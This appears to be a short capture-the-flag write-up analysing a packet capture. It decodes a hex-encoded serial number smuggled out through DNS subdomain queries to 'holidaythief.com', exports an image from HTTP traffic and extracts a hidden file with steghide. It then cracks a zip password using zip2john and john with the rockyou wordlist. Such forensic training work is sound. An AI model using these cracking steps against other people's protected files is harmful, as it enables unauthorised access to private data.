Data Exfiltration
=================

Identify data exfiltration attempts
-----------------------------------

In this case, look for a name resolution query for A, AAAA followed by a
long string of seemingly random characters as a subdomain.

    DNS Standard query 0xaafe A 43616e64792043616e652053657269616c204e756d6265722038343931.holidaythief.com
    DNS Standard query 0x3b9a AAAA 43616e64792043616e652053657269616c204e756d6265722038343931.holidaythief.com

That long string of characters is a hex encoded string, convert it to
ASCII and we get

    Candy Cane Serial Number 8491

Check HTTP requests for anything weird, like images from a malicious
domain.

    103 12.032858   192.168.1.107   192.168.1.105   HTTP    528 GET /TryHackMe.jpg HTTP/1.1 

    ...

    [Full request URI: http://holidaythief.com/TryHackMe.jpg]

Save the image with wireshark through
`File -> Export Objects -> HTTP -> TryHackMe.jpg`

The image contains a hidden file, extract it with:

    steghide --extract -sf TryHackMe.jpg

They took christmaslists.zip, we can download save it and check its
contents. It is protected by a password. Let's crack it:

    > zip2john christmaslists.zip > zip2john.txt
    > john --wordlist=rockyou.txt zip2john.txt

    december
